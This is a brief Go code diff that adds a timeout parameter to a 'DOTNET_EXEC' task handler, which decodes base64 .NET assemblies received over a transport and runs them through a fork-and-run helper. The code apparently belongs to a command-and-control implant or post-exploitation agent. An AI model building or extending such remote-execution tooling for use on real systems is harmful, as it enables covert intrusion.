@@ -298,6 +298,7 @@ func dispatchTask(t transport, task taskWire) {
 			Args   string `json:"args"`
 			Type   string `json:"type"`
 			Method string `json:"method"`
+			TimeoutSec int `json:"timeout_sec"`
 		}
 		if err := json.Unmarshal([]byte(task.Args), &da); err != nil {
 			t.sendResult(task.ID, "", "bad DOTNET_EXEC args: "+err.Error())
@@ -312,7 +313,7 @@ func dispatchTask(t transport, task taskWire) {
 			t.sendResult(task.ID, "", "DOTNET_EXEC: base64 decode asm: "+err.Error())
 			return
 		}
-		output, err := forkRunAssembly(asmBytes, da.Args)
+		output, err := forkRunAssembly(asmBytes, da.Args, da.TimeoutSec)
 		errStr := ""
 		if err != nil {
 			errStr = err.Error()
